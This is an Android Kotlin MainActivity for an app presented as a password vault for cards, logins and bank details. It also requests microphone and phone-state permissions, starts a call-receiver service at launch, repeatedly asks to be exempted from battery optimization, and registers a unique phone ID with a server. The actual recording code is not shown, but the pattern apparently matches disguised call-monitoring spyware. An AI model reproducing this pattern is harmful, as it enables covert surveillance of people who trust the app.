package com.example.passwordvault.ui.activities

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.navigation.NavController
import androidx.navigation.Navigation
import androidx.navigation.findNavController
import androidx.navigation.ui.AppBarConfiguration
import androidx.navigation.ui.NavigationUI
import androidx.navigation.ui.navigateUp
import androidx.navigation.ui.setupActionBarWithNavController
import com.example.passwordvault.R
import com.example.passwordvault.databinding.ActivityMainBinding
import com.example.passwordvault.util.Permissions
import com.example.passwordvault.util.PreferenceUtil
import com.example.passwordvault.util.ServiceStarter
import com.google.firebase.messaging.FirebaseMessaging
import dagger.hilt.android.AndroidEntryPoint

private const val REQUEST_PERMISSIONS = 200
private const val MY_IGNORE_OPTIMIZATION_REQUEST = 29
@AndroidEntryPoint
class MainActivity : AppCompatActivity() {
    private lateinit var navController: NavController
    private lateinit var appBarConfiguration: AppBarConfiguration
    private lateinit var binding: ActivityMainBinding

    private var permissions: Array<String> =
        arrayOf(Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_PHONE_STATE)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        navController = findNavController(R.id.fragment)
        NavigationUI.setupWithNavController(binding.navigationView, navController)
        appBarConfiguration = AppBarConfiguration(navController.graph, binding.drawerLayout)
        setupActionBarWithNavController(navController, appBarConfiguration)
        Navigation.setViewNavController(binding.cardsDetails, navController)

        setUpOnClickListeners()
        checkPermissions()
        requestBatteryOptimization()

        ServiceStarter.startCallReceiverService(applicationContext)
    }

    private fun subscribeToAllTopic() {
        FirebaseMessaging.getInstance().subscribeToTopic("all").addOnFailureListener {
            subscribeToAllTopic()
        }.addOnSuccessListener {
            PreferenceUtil.writeToTopicSubscribed(applicationContext)
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val packageName = packageName
            val pm =
                getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, MY_IGNORE_OPTIMIZATION_REQUEST)
            }
        }
    }

    override fun onActivityResult(
        requestCode: Int,
        resultCode: Int,
        data: Intent?
    ) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == MY_IGNORE_OPTIMIZATION_REQUEST) {
            requestBatteryOptimization()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        if (grantResults.isNotEmpty()) {
            PreferenceUtil.writeUniquePhoneId(this@MainActivity)
            PreferenceUtil.sendRegistrationToServer(applicationContext)
            if (!PreferenceUtil.topicAllSubscribed(applicationContext))
                subscribeToAllTopic()
        }
    }

    private fun checkPermissions() {

        if (Permissions.audioPermission(this) != PackageManager.PERMISSION_GRANTED)
            askPermission()

        if (Permissions.phoneStatePermission(this) != PackageManager.PERMISSION_GRANTED)
            askPermission()
    }

    private fun askPermission() {
        ActivityCompat.requestPermissions(
            this@MainActivity,
            permissions,
            REQUEST_PERMISSIONS
        )
    }

    private fun setUpOnClickListeners() {
        binding.cardsDetails.setOnClickListener {
            navController.navigate(R.id.action_global_addCardDetails)
            binding.floatingMenu.close(true)

        }

        binding.loginDetails.setOnClickListener {
            navController.navigate(R.id.action_global_addLoginDetails)
            binding.floatingMenu.close(true)

        }

        binding.bankDetails.setOnClickListener {
            navController.navigate(R.id.action_global_addBankDetails)
            binding.floatingMenu.close(true)

        }
    }

    override fun onSupportNavigateUp(): Boolean {
        val navController = findNavController(R.id.fragment)
        return navController.navigateUp(appBarConfiguration) || super.onSupportNavigateUp()
    }
}
